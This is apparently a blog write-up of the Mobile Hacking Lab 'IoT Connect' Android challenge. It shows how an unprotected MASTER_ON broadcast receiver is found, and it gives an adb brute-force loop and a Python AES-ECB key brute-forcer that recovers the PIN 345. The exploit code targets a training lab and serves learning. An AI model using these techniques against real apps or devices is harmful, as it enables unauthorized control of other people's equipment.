---
title:  "Mobile Hacking IoT Connect Writeup"
date:   2024-01-22T16:34:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for [IoT Connect](https://www.mobilehackinglab.com/course/lab-iot-connect) challenge from Mobile Hacking Lab. 

## Static Analysis
When we open the app in emulator, it opens a login page with login and signup buttons. We can create a new account with name and password. After logging in,  we can control some of ıot devices status(on/off) but we can not control AC, speakers and TV. Our account is a guest account and guests have limited permissions on devices.

Also there is a master switch button. This button can start all devices but guests can not use this button and its protected with 3 digit pin. Lets start our analyze with manifest file. 

![](/assets/images_mhl_iotconnect/manifest.png)

When we examine the manifest file, we see that a broadcast receiver named MasterReceiver defined without any permission protection. It means that everyone can trigger this receiver with proper arguments. Sample broadcast:  
```bash
adb shell am  broadcast -a MASTER_ON
```
I just searched name of this broadcast receiver and find the implementation in CommunicationManager class. Also you can search "registerReceiver" string to find broadcast receivers registers.

![](/assets/images_mhl_iotconnect/broadcastDefinition.png)
 
As seen in screenshot, we need to send broadcast with `"MASTER_ON"` action and a key as extra integer. This key sended to `check_key` function. If our key is correct, `turnOnAllDevices` will be called and we can turn on all devices without master account. Lets analyse check_key function. 

### check_key Function

![](/assets/images_mhl_iotconnect/check_key.png)

In this function, our key used to decrypt a base64 string and after decryption, expected result is `"master_on"` string. During key generation, our 3 digit key copied to another array. This array have 16 bytes and we have 13 null bytes after our key.
```
Algorith: AES ECB
Encrypted string: "OSnaALIWUkpOziVAMycaZQ=="
Key: our_key + 13*'\x00'

Expected result: "master_on"

```
With this information we can bruteforce key to find correct pin. For this attack you can use frida for following aes decryption processes and small bash script for sending broadcast with key. I used frida script from frida codeshare: https://codeshare.frida.re/@dzonerzy/aesinfo/

Bash script:
```bash
#!/bin/bash

for ((i=1; i<=999; i++)); do
    key=$(printf "%03d" $i) 
    echo $key
    adb shell am broadcast -a MASTER_ON --ei key $key
 
done

```
And PoC video:

[![](https://img.youtube.com/vi/GjnLXUowas4/0.jpg)](https://youtu.be/GjnLXUowas4)

Also I wroted small python script(with help of ch*tGPT). We can bruteforce key with this scirpt. Here is my code:
```py
from Crypto.Cipher import AES
import base64

encrypted_text = b'OSnaALIWUkpOziVAMycaZQ=='


def decrypt_with_key(encrypted_text, key):
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_text = cipher.decrypt(base64.b64decode(encrypted_text))
    return decrypted_text.decode('utf-8').strip()


def brute_force_decrypt(encrypted_text):
    for i in range(1000):
        key_prefix = str(i).zfill(3)
        key_suffix = b'\x00' * 13
        key = key_prefix.encode('utf-8') + key_suffix     
        #sh4d0wless
        try:
            decrypted_text_str = decrypt_with_key(encrypted_text, key)
            if "master_on" in decrypted_text_str:
                print("Key found: " + key.decode("utf-8") +" "+ decrypted_text_str)
                
        except UnicodeDecodeError:
            continue

brute_force_decrypt(encrypted_text)

```

```bash
sh4d0wless@paradise:~/Desktop$ python3 testoo.py 
Key found: 345 master_on
sh4d0wless@paradise:~/Desktop$ 

```
Our key is "345". We can turn on all devices with this key🎉🎉🎉:

[![](https://img.youtube.com/vi/qpdPvkfByc4/0.jpg)](https://youtu.be/qpdPvkfByc4)

Thanks for reading! See you in next writeups 👋🏻👋🏻
